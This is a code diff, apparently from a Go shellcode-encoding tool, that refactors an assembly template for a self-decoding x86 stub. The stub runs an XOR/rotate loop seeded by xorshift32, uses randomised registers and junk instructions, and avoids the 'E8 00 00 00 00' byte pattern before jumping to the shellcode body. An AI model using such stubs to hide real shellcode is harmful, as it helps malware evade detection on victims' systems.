@@ -24,47 +24,47 @@ header:
   pushad                                       {{igi}}
   pushfd                                       {{igi}}
 
-  mov {{.EAX}}, {{hex .Seed}}                  {{igi}}
-  mov {{.EBX}}, {{hex .Key}}                   {{igi}}
+  mov {{.Reg.eax}}, {{hex .Seed}}              {{igi}}
+  mov {{.Reg.ebx}}, {{hex .Key}}               {{igi}}
 
   // prevent continuous 0x00
-  mov {{.ECX}}, {{hex .NumLoopStub}}           {{igi}}
-  xor {{.ECX}}, {{hex .NumLoopMaskA}}          {{igi}}
-  xor {{.ECX}}, {{hex .NumLoopMaskB}}          {{igi}}
+  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{igi}}
+  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{igi}}
+  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{igi}}
 
   // for prevent "E8 00 00 00 00"
   call calc_body_addr
- flag_CEA:                                          {{igi}}
-  add {{.ESI}}, body - flag_CEA + {{hex .OffsetT}}  {{igi}}
-  add {{.ESI}}, {{hex .OffsetA}}                    {{igi}}
-  sub {{.ESI}}, {{hex .OffsetS}}                    {{igi}}
+ flag_CEA:                                              {{igi}}
+  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{igi}}
+  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{igi}}
+  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{igi}}
 
  loop_xor:
   // xor block data
-  mov {{.EDI}}, [{{.ESI}}]                     {{igi}}
-  ror {{.EDI}}, 5                              {{igi}}
-  xor {{.EDI}}, {{.EAX}}                       {{igi}}
-  rol {{.EDI}}, 17                             {{igi}}
-  xor {{.EDI}}, {{.EBX}}                       {{igi}}
-  mov [{{.ESI}}], {{.EDI}}                     {{igi}}
+  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{igi}}
+  ror {{.Reg.edi}}, 5                          {{igi}}
+  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igi}}
+  rol {{.Reg.edi}}, 17                         {{igi}}
+  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igi}}
+  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{igi}}
 
   // xor shift 32
   // seed ^= seed << 13
   // seed ^= seed >> 17
   // seed ^= seed << 5
-  mov {{.EDX}}, {{.EAX}}                       {{igi}}
-  shl {{.EDX}}, 13                             {{igi}}
-  xor {{.EAX}}, {{.EDX}}                       {{igi}}
-  mov {{.EDX}}, {{.EAX}}                       {{igi}}
-  shr {{.EDX}}, 17                             {{igi}}
-  xor {{.EAX}}, {{.EDX}}                       {{igi}}
-  mov {{.EDX}}, {{.EAX}}                       {{igi}}
-  shl {{.EDX}}, 5                              {{igi}}
-  xor {{.EAX}}, {{.EDX}}                       {{igi}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
+  shl {{.Reg.edx}}, 13                         {{igi}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
+  shr {{.Reg.edx}}, 17                         {{igi}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
+  shl {{.Reg.edx}}, 5                          {{igi}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
 
   // update address and counter
-  add {{.ESI}}, 4                              {{igi}}
-  dec {{.ECX}}                                 {{igi}}
+  add {{.Reg.esi}}, 4                          {{igi}}
+  dec {{.Reg.ecx}}                             {{igi}}
   jnz loop_xor                                 {{igi}}
 
   // restore context
@@ -74,8 +74,8 @@ header:
   // go to the shellcode body
   jmp body                                     {{igi}}
 calc_body_addr:
-  pop  {{.ESI}}                                {{igi}}
-  push {{.ESI}}                                {{igi}}
+  pop  {{.Reg.esi}}                            {{igi}}
+  push {{.Reg.esi}}                            {{igi}}
   ret                                          {{igi}}
 
 body:
@@ -168,12 +168,7 @@ type miniDecoderCtx struct {
 	OffsetS int32
 
 	// for replacement
-	EAX string
-	EBX string
-	ECX string
-	EDX string
-	ESI string
-	EDI string
+	Reg map[string]string
 }
 
 // The role of the shellcode loader is to execute the shellcode
